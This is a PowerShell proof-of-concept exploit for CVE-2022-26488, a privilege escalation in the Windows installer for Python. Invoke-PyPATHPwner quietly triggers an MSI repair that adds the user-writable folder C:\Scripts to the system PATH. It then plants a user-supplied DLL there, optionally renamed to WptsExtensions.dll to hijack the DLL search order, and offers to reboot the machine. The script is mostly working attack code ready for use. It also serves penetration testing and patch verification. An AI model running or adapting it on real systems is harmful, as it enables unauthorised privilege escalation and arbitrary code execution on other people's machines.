function Get-FileMetaData {
    <#
    .SYNOPSIS
    Small function that gets metadata information from file providing similar output to what Explorer shows when viewing file

    .DESCRIPTION
    Small function that gets metadata information from file providing similar output to what Explorer shows when viewing file

    .PARAMETER File
    FileName or FileObject

    .EXAMPLE
    Get-ChildItem -Path $Env:USERPROFILE\Desktop -Force | Get-FileMetaData | Out-HtmlView -ScrollX -Filtering -AllProperties

    .EXAMPLE
    Get-ChildItem -Path $Env:USERPROFILE\Desktop -Force | Where-Object { $_.Attributes -like '*Hidden*' } | Get-FileMetaData | Out-HtmlView -ScrollX -Filtering -AllProperties

    .NOTES
    Source: https://evotec.xyz/getting-file-metadata-with-powershell-similar-to-what-windows-explorer-provides/
    #>
    [CmdletBinding()]
    param (
        [Parameter(Position = 0, ValueFromPipeline)][Object] $File,
        [switch] $Signature
    )
    Process {
        foreach ($F in $File) {
            $MetaDataObject = [ordered] @{}
            if ($F -is [string]) {
                $FileInformation = Get-ItemProperty -Path $F
            } elseif ($F -is [System.IO.DirectoryInfo]) {
                #Write-Warning "Get-FileMetaData - Directories are not supported. Skipping $F."
                continue
            } elseif ($F -is [System.IO.FileInfo]) {
                $FileInformation = $F
            } else {
                Write-Warning "Get-FileMetaData - Only files are supported. Skipping $F."
                continue
            }
            $ShellApplication = New-Object -ComObject Shell.Application
            $ShellFolder = $ShellApplication.Namespace($FileInformation.Directory.FullName)
            $ShellFile = $ShellFolder.ParseName($FileInformation.Name)
            $MetaDataProperties = [ordered] @{}
            0..400 | ForEach-Object -Process {
                $DataValue = $ShellFolder.GetDetailsOf($null, $_)
                $PropertyValue = (Get-Culture).TextInfo.ToTitleCase($DataValue.Trim()).Replace(' ', '')
                if ($PropertyValue -ne '') {
                    $MetaDataProperties["$_"] = $PropertyValue
                }
            }
            foreach ($Key in $MetaDataProperties.Keys) {
                $Property = $MetaDataProperties[$Key]
                $Value = $ShellFolder.GetDetailsOf($ShellFile, [int] $Key)
                if ($Property -in 'Attributes', 'Folder', 'Type', 'SpaceFree', 'TotalSize', 'SpaceUsed') {
                    continue
                }
                If (($null -ne $Value) -and ($Value -ne '')) {
                    $MetaDataObject["$Property"] = $Value
                }
            }
            if ($FileInformation.VersionInfo) {
                $SplitInfo = ([string] $FileInformation.VersionInfo).Split([char]13)
                foreach ($Item in $SplitInfo) {
                    $Property = $Item.Split(":").Trim()
                    if ($Property[0] -and $Property[1] -ne '') {
                        $MetaDataObject["$($Property[0])"] = $Property[1]
                    }
                }
            }
            $MetaDataObject["Attributes"] = $FileInformation.Attributes
            $MetaDataObject['IsReadOnly'] = $FileInformation.IsReadOnly
            $MetaDataObject['IsHidden'] = $FileInformation.Attributes -like '*Hidden*'
            $MetaDataObject['IsSystem'] = $FileInformation.Attributes -like '*System*'
            if ($Signature) {
                $DigitalSignature = Get-AuthenticodeSignature -FilePath $FileInformation.Fullname
                $MetaDataObject['SignatureCertificateSubject'] = $DigitalSignature.SignerCertificate.Subject
                $MetaDataObject['SignatureCertificateIssuer'] = $DigitalSignature.SignerCertificate.Issuer
                $MetaDataObject['SignatureCertificateSerialNumber'] = $DigitalSignature.SignerCertificate.SerialNumber
                $MetaDataObject['SignatureCertificateNotBefore'] = $DigitalSignature.SignerCertificate.NotBefore
                $MetaDataObject['SignatureCertificateNotAfter'] = $DigitalSignature.SignerCertificate.NotAfter
                $MetaDataObject['SignatureCertificateThumbprint'] = $DigitalSignature.SignerCertificate.Thumbprint
                $MetaDataObject['SignatureStatus'] = $DigitalSignature.Status
                $MetaDataObject['IsOSBinary'] = $DigitalSignature.IsOSBinary
            }
            [PSCustomObject] $MetaDataObject
        }
    }
}

function Find-PythonAddToPathMSI {
    $Files = Get-ChildItem c:\windows\installer

    foreach ($File in $Files){
        $Subject = Get-FileMetaData -File $File -Signature | select Subject
        if ($Subject -like "*Python*Add to Path*"){
            return $File
        }
    }
}

function art {
$art =  
"
    ██████╗ ██╗   ██╗██████╗  █████╗ ████████╗██╗  ██╗██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗╚══██╔══╝██║  ██║██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
    ██████╔╝ ╚████╔╝ ██████╔╝███████║   ██║   ███████║██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
    ██╔═══╝   ╚██╔╝  ██╔═══╝ ██╔══██║   ██║   ██╔══██║██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
    ██║        ██║   ██║     ██║  ██║   ██║   ██║  ██║██║     ╚███╔███╔╝██║ ╚████║███████╗██║  ██║
    ╚═╝        ╚═╝   ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝                                                                                  
    Exploit for CVE-2022-26488 discovered by the Lockheed Martin Red Team
    Written by: Spencer Alessi @techspence
"
$art
}

function Invoke-PyPATHPwner {
    <#
    .SYNOPSIS
    POC Exploit for CVE-2022-26488 - Python for Windows (CPython) escalation of privilege vulnerability, discovered by the Lockheed Martin Red Team.

    .DESCRIPTION
    CVE-2022-26488 is an escalation of privilege vulnerability in the Windows installer for the following releases of CPython:

        - 3.11.0a6 and earlier
        - 3.10.2 and earlier
        - 3.9.10 and earlier
        - 3.8.12 and earlier
        - 3.7.12 and earlier
        - All end-of-life releases of 3.5 and 3.6
        
    The vulnerability exists when installed for all users with the "Add 
    Python to PATH" option selected. A local user without administrative 
    permissions can trigger a repair operation of this PATH option to add 
    incorrect additional paths to the system PATH variable, and then use 
    search path hijacking to achieve escalation of privilege. Per-user 
    installs (the default) are also affected, but cannot be used for 
    escalation of privilege.

    .PARAMETER DllPath
    The path to your totally legit dll

    .PARAMETER NewDllName
    Optional parameter to rename your totally legit dll

    .EXAMPLE
    Invoke-PyPATHPwner -DllPath c:\users\pentest\desktop\hijacker.dll

    .EXAMPLE
    Invoke-PyPATHPwner -DllPath c:\users\pentest\desktop\hijacker.dll -NewDllName WptsExtensions.dll

    .EXAMPLE
    Invoke-PyPATHPwner -DllPath C:\users\pentest\Desktop\adduser.dll -Verbose 

    .NOTES
    https://mail.python.org/archives/list/security-announce@python.org/thread/657Z4XULWZNIY5FRP3OWXHYKUSIH6DMN/
    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-26488
    https://hackandpwn.com/cve-2022-26488/
    #>
    [CmdletBinding()]
    param(
        [Parameter (Mandatory=$true)]
        $DllPath,
        [Parameter (Mandatory=$false)]
        $NewDllName
    )

    if ($VerbosePreference -eq "Continue") {
        $ShowArt = art
        Write-Host $ShowArt -ForegroundColor DarkGreen
        Write-Verbose "[!] Executing PyPATHPwner, please wait..."
    } else {
        Write-Host "`n[!] Executing PyPATHPwner, please wait..."
    }

    $PythonMSI = Find-PythonAddToPathMSI
    Write-Verbose "[i] Initiating repair of Python Add to Path MSI with msiexec"
    msiexec.exe /fa $PythonMSI.FullName /quiet

    Write-Verbose "[i] Checking to see if Python Add to Path MSI repair was successful"
    $PathFolder = 'C:\Scripts'
    if (Test-Path -Path $PathFolder) {
        Write-Verbose "[i] Python Add to Path MSI repair was successful"
    }

    Write-Verbose "[i] Checking the system PATH for new entries"
    $PATH = $env:Path
    $PathFolderEscaped = $PathFolder.Replace('\','\\')
    if ($PATH -match $PathFolderEscaped){
        if ($VerbosePreference -eq "Continue") {
            Write-Verbose "[i] $PathFolder added to system PATH"
        } else {
            Write-Host "[i] $PathFolder added to system PATH"
        }
        $ACL = (Get-Acl $PathFolder).Access | Where-Object {$_.IdentityReference -eq 'NT AUTHORITY\Authenticated Users' -and $_.FileSystemRights -match 'Modify' -and $_.AccessControlType -eq 'Allow'}
        if ($ACL) {
            if ($VerbosePreference -eq "Continue") {
                Write-Verbose "[i] $($ACL.IdentityReference) now has $($ACL.FileSystemRights) rights on $PathFolder"
            } else {
                Write-Host "[i] $($ACL.IdentityReference) now has $($ACL.FileSystemRights) rights on $PathFolder"
            }
        }
    }

    Write-Verbose "[i] Moving our payload in place"
    Copy-Item $DllPath -Destination $PathFolder
    $DllName = $DllPath | Select-String -Pattern "\w+.dll" | % {$_.Matches} | % {$_.Value}
    $NewDLLPath = $PathFolder + '\' + $DllName
    if (Test-Path $NewDLLPath){
        Write-Verbose "[i] $DllPath moved successfully to $NewDLLPath"
    } else {
        Write-Verbose "[ERROR] $DllPath didn't copy successfully"
    }

    if ($NewDllName) {
        $NewDllPathNewName = $PathFolder + '\' + $NewDllName
        if ($VerbosePreference -eq "Continue") {
            Write-Verbose "[i] Renaming $DllName to $NewDllName"
        } else {
            Write-Host "[i] Renaming $DllName to $NewDllName"
        }
        
        Move-Item $NewDLLPath -Destination $NewDllPathNewName -Force
    }

    $Reboot = Read-Host -Prompt "[i] Would you like to reboot? (y/n)"
    if ($Reboot.ToLower() -eq 'y') {
        Write-Host "[!] Rebooting in 60 seconds. To cancel the reboot run: shutdown -a"
        shutdown -r -t 60
    } else {
        Write-Host "[i] NOT rebooting. You will have to find another way to execute your dll or wait patiently"
    }

    Write-Host "[+] PyPathPwner is finished. May the odds be ever in your favor"
}